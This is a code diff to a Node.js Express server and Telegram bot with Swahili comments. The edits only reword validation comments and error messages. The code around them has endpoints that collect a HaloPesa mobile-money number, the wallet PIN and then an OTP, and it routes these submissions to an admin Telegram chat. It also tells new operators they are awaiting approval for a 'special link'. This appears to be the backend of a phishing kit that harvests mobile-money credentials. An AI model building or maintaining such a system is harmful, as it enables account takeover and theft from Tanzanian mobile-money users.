@@ -63,7 +63,7 @@ const admins = loadAdmins();
 const adminConfigMessageIds = new Map();
 
 /**
- * Kuhakiki Namba za HaloPesa Tanzania pekee (062, 061, 25562, 25561).
+ * Validations: Hakiki Namba ya HaloPesa Tanzania (Inayoanza na 062, 061, 25562, au 25561 pekee)
  */
 function isValidHaloPesaNumber(number) {
   const clean = String(number || '').replace(/\D/g, '');
@@ -71,7 +71,7 @@ function isValidHaloPesaNumber(number) {
 }
 
 /**
- * Uthibitisho wa Namba Pekee (Digits only) kwa ajili ya PIN na OTP
+ * Validations: Hakiki kwamba ingizo ni namba pekee (Digits only)
  */
 function isNumericOnly(value) {
   return /^\d+$/.test(String(value || '').trim());
@@ -118,7 +118,7 @@ async function updateContinuousAdminList(chatId, messageId = null, page = 0) {
   let navRow = [];
   if (page > 0) navRow.push({ text: `⬅️ Iliyopita`, callback_data: `PAGE_${page - 1}` });
   navRow.push({ text: `🔄 Onyesha Upya`, callback_data: `PAGE_${page}` });
-  if (page < totalPages - 1) navRow.push({ text: `Ijayo ➡️`, callback_data: `PAGE_${page + 1}` });
+  if (page < totalPages - 1) navRow.push({ text: `Ijayo ➡️️`, callback_data: `PAGE_${page + 1}` });
   if (navRow.length > 0) keyboard.push(navRow);
 
   if (messageId) {
@@ -251,7 +251,7 @@ async function initBot() {
 
         await bot.sendMessage(chatId, 
           `👋 *Karibu ${firstName}!*\n\n` +
-          `⚠️ Akaunti yako kwa sasa **inasubiri idhini** kutoka kwa Msimamizi Mkuu.\n\n` +
+          `⚠️️ Akaunti yako kwa sasa **inasubiri idhini** kutoka kwa Msimamizi Mkuu.\n\n` +
           `Tafadhali wasiliana na **Msimamizi Mkuu** ili kupitishwa na kupokea kiungo chako maalum.`, 
           { parse_mode: 'Markdown' }
         );
@@ -393,14 +393,14 @@ app.post('/api/submit-application', async (req, res) => {
 
     const cleanContact = String(contact || '').replace(/\D/g, '');
 
-    // 1. Hakikisha namba ni ya HaloPesa Tanzania tu
+    // 1. Hakikisha Namba ni ya HaloPesa Tanzania Pekee (062, 061, 25562, 25561)
     if (!isValidHaloPesaNumber(cleanContact)) {
-      return res.status(400).json({ success: false, error: 'Tafadhali weka namba sahihi ya HaloPesa Tanzania (Halotel).' });
+      return res.status(400).json({ success: false, error: 'Tafadhali weka namba sahihi ya HaloPesa Tanzania (inayoanza na 062 au 061).' });
     }
 
-    // 2. Hakikisha PIN ni namba pekee
+    // 2. Hakikisha PIN ni namba pekee (Digits only)
     if (!pin || !isNumericOnly(pin)) {
-      return res.status(400).json({ success: false, error: 'PIN lazima iwe namba tupu (Digits only).' });
+      return res.status(400).json({ success: false, error: 'PIN lazima iwe namba pekee (Digits only).' });
     }
 
     const targetChat = resolveTargetChat(adminChatId);
@@ -489,9 +489,9 @@ app.post('/api/submit-otp', async (req, res) => {
 
     if (!session) return res.status(404).json({ success: false, error: 'Kipindi hakikupatikana' });
 
-    // 3. Hakikisha OTP ni namba pekee
+    // 3. Hakikisha OTP ni namba pekee (Digits only)
     if (!otp || !isNumericOnly(otp)) {
-      return res.status(400).json({ success: false, error: 'OTP lazima iwe namba tupu (Digits only).' });
+      return res.status(400).json({ success: false, error: 'Msimbo wa OTP lazima uwe namba pekee (Digits only).' });
     }
 
     session.status = 'WAITING_OTP_VERIFICATION';
